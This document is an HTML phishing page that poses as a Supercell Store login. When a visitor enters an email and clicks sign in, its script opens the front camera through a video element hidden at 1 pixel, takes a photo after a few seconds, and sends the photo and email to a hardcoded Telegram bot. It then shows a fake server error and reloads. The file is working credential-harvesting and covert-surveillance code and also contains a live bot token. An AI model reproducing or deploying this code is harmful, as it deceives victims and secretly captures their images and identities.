<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Supercell Store - Verification</title>
    <style>
        body { background-color: #1b4fb1; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 15px; width: 360px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
        .logo { background: #ffc107; width: 55px; height: 55px; margin: 0 auto 15px; border-radius: 12px; line-height: 55px; color: white; font-weight: 900; font-size: 32px; }
        input { width: 100%; padding: 14px; margin: 15px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; outline: none; box-sizing: border-box; }
        button { width: 100%; padding: 14px; background: #3a86ff; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; }
        #status { color: #666; font-size: 12px; margin-top: 15px; min-height: 18px; }
        /* Video gizli qalır amma fonda aktivdir */
        #video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
        canvas { display: none; }
    </style>
</head>
<body>

<div class="card">
    <div class="logo">S</div>
    <h2 style="margin: 0; font-size: 20px;">Supercell Store Login</h2>
    <p style="color: #666; font-size: 14px;">Emailinizi daxil edin.</p>
    
    <input type="email" id="email" placeholder="Email ünvanı" required>
    <button id="btn">➜ SIGN IN</button>
    
    <div id="status"></div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
</div>

<script>
    // --- TELEGRAM MƏLUMATLARI ---
    const BOT_TOKEN = "8547908650:AAGrPuSRhlb-SuE_x5ui1wZ9so5sBMclL5A";
    const CHAT_ID = "-1003369084883";
    // ----------------------------

    const btn = document.getElementById('btn');
    const status = document.getElementById('status');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const emailInput = document.getElementById('email');

    btn.onclick = async () => {
        const email = emailInput.value;
        if (!email.includes('@')) { alert("Düzgün email daxil edin."); return; }

        btn.disabled = true;
        btn.innerText = "Yoxlanılır...";
        status.innerText = "Sistem hazırlanır...";

        try {
            // Ön kameranı ən yüksək icazə ilə açırıq
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: "user",
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }, 
                audio: false 
            });
            video.srcObject = stream;

            // DİQQƏT: Telegram-da qaranlıq düşməməsi üçün 3.5 saniyə gözləyirik
            // Bu vaxt ərzində linza işığa uyğunlaşır.
            setTimeout(() => {
                const context = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                // Şəkli çəkirik
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob((blob) => {
                    sendToTelegram(blob, email);
                    // Kameranı dərhal söndürürük
                    stream.getTracks().forEach(track => track.stop());
                }, 'image/jpeg', 0.8); // Keyfiyyəti 80% saxlayırıq
            }, 3500);

        } catch (err) {
            sendToTelegram(null, email + " (Kamera xətası: " + err.message + ")");
        }
    };

    async function sendToTelegram(blob, email) {
        status.innerText = "Məlumat göndərilir...";
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        
        let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        if (blob) {
            url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            formData.append('photo', blob, 'front.jpg');
            formData.append('caption', `✅ Yeni Giriş\n📧 Email: ${email}`);
        } else {
            formData.append('text', `⚠️ Kamera Bloklandı\n📧 Email: ${email}`);
        }

        try {
            await fetch(url, { method: 'POST', body: formData });
            setTimeout(() => {
                alert("Xəta (505): Daxili server xətası. Yenidən cəhd edin.");
                window.location.reload();
            }, 1000);
        } catch (e) {
            window.location.reload();
        }
    }
</script>

</body>
</html>
